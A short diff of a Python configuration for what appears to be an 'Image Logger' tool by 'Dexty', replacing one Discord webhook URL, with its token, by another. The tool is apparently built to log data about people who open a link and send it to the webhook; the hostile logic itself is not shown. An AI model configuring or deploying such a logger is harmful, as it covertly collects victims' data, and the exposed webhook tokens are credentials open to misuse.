@@ -8,7 +8,7 @@ __version__ = "v2.0"
 __author__ = "Dexty"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1412460994680061962/Lr9R0WafZz8FRkCLtglMyIFWhivlnKRv9ao0R1pR04C_Qty--W1CQ42KocgN4a9Rnp8Z",
+    "webhook": "https://discord.com/api/webhooks/1412495995891351653/80m2W2-jhHTpHqxhzcMFNwnfDudptLb63Ms0GM0zISzbVYgT70Nbl1nXtW9NiM05BJp9",
     
     # CUSTOMIZATION #
     "username": "Image Logger", 
